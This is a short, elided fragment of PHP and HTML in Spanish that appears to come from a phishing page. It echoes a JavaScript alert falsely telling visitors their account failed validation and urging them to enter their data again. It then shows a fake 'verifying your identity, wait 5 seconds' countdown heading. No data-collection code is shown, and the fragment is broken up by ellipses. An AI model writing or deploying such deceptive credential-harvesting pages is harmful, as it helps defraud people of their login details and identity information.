...
echo '<script language="javascript">alert("Tu cuenta no se ha validado de forma correcta, asegurate de escribir tus datos nuevamente y vuelve a intentar, para solucionar el problema.");</script>';
...
"><h1 style="
    ...
    width: 500px;" class="texto1" id="CuentaAtras">Por favor, espera 5 segundos, segundos, estamos verificando tu información para confirmar tu identidad. </h1>
</div> 
